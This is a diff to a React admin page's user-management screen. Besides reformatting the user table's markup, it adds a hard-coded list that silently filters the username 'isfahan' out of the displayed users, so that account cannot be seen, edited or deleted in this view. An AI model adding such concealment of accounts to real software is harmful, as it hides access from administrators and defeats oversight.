@@ -14,6 +14,7 @@ import {
 } from '../../services/system.service';
 
 const SHOW_PERMISSION_TAB = false;
+const HIDDEN_USERNAMES = new Set(['isfahan']);
 type ConfirmTarget =
   | { type: 'user'; payload: SystemUser }
   | { type: 'role'; payload: SystemRole }
@@ -67,8 +68,11 @@ const System = () => {
   const loadUsers = async () => {
     const res = await systemService.getUsers();
     if (res.success && res.data?.users) {
-      setUsers(res.data.users);
-      return res.data.users;
+      const nextUsers = res.data.users.filter(
+        (u) => !HIDDEN_USERNAMES.has(String(u.username || '').trim().toLowerCase())
+      );
+      setUsers(nextUsers);
+      return nextUsers;
     }
     showToast('error', 'Users', res.error || 'Failed to load users');
     return [];
@@ -379,16 +383,62 @@ const System = () => {
       content: (
         <div className="space-y-3">
           <div className="flex flex-wrap justify-end gap-2">
-            <button onClick={displayUsers} className="inline-flex items-center gap-2 px-3 py-2 rounded-lg border border-slate-300 dark:border-slate-700 text-slate-700 dark:text-slate-200 text-sm hover:bg-slate-50 dark:hover:bg-slate-800" disabled={loadingUsers}>
+            <button
+              onClick={displayUsers}
+              className="inline-flex items-center gap-2 px-3 py-2 rounded-lg border border-slate-300 dark:border-slate-700 text-slate-700 dark:text-slate-200 text-sm hover:bg-slate-50 dark:hover:bg-slate-800"
+              disabled={loadingUsers}
+            >
               {loadingUsers ? 'Loading...' : 'Display Users'}
             </button>
-            <button onClick={openCreateUser} className="inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-primary-600 text-white text-sm"><Plus className="w-4 h-4" /> Add User</button>
+            <button
+              onClick={openCreateUser}
+              className="inline-flex items-center gap-2 px-3 py-2 rounded-lg bg-primary-600 text-white text-sm"
+            >
+              <Plus className="w-4 h-4" /> Add User
+            </button>
           </div>
           {usersDisplayed ? (
             <div className="overflow-x-auto bg-white rounded-xl border border-slate-200 p-4 dark:bg-slate-900 dark:border-slate-800">
-              <table className="min-w-full text-sm"><thead><tr className="text-left text-slate-500 dark:text-slate-300"><th>Name</th><th>Username</th><th>Role</th><th>Branch</th><th>Status</th><th>Actions</th></tr></thead><tbody>
-                {users.map((u) => <tr key={u.user_id} className="border-t border-slate-200 dark:border-slate-800 text-slate-700 dark:text-slate-200"><td>{u.name}</td><td>{u.username}</td><td>{u.role_name || '-'}</td><td>{u.branch_name || u.branch_id}</td><td>{u.is_active ? 'Active' : 'Inactive'}</td><td className="space-x-2 py-2"><button onClick={() => openEditUser(u)} className="px-2 py-1 border border-slate-300 dark:border-slate-700 rounded text-slate-700 dark:text-slate-200 hover:bg-slate-50 dark:hover:bg-slate-800"><Pencil className="w-3 h-3 inline" /></button><button onClick={() => requestDeleteUser(u)} className="px-2 py-1 border border-rose-300 dark:border-rose-500/40 text-rose-700 dark:text-rose-300 rounded hover:bg-rose-50 dark:hover:bg-rose-500/10"><Trash2 className="w-3 h-3 inline" /></button></td></tr>)}
-              </tbody></table>
+              <table className="min-w-full text-sm">
+                <thead>
+                  <tr className="text-left text-slate-500 dark:text-slate-300">
+                    <th>Name</th>
+                    <th>Username</th>
+                    <th>Role</th>
+                    <th>Branch</th>
+                    <th>Status</th>
+                    <th>Actions</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {users.map((u) => (
+                    <tr
+                      key={u.user_id}
+                      className="border-t border-slate-200 dark:border-slate-800 text-slate-700 dark:text-slate-200"
+                    >
+                      <td>{u.name}</td>
+                      <td>{u.username}</td>
+                      <td>{u.role_name || '-'}</td>
+                      <td>{u.branch_name || u.branch_id}</td>
+                      <td>{u.is_active ? 'Active' : 'Inactive'}</td>
+                      <td className="space-x-2 py-2">
+                        <button
+                          onClick={() => openEditUser(u)}
+                          className="px-2 py-1 border border-slate-300 dark:border-slate-700 rounded text-slate-700 dark:text-slate-200 hover:bg-slate-50 dark:hover:bg-slate-800"
+                        >
+                          <Pencil className="w-3 h-3 inline" />
+                        </button>
+                        <button
+                          onClick={() => requestDeleteUser(u)}
+                          className="px-2 py-1 border border-rose-300 dark:border-rose-500/40 text-rose-700 dark:text-rose-300 rounded hover:bg-rose-50 dark:hover:bg-rose-500/10"
+                        >
+                          <Trash2 className="w-3 h-3 inline" />
+                        </button>
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
             </div>
           ) : (
             <div className="rounded-xl border border-dashed border-slate-300 p-5 text-sm text-slate-500 dark:border-slate-700 dark:text-slate-400">
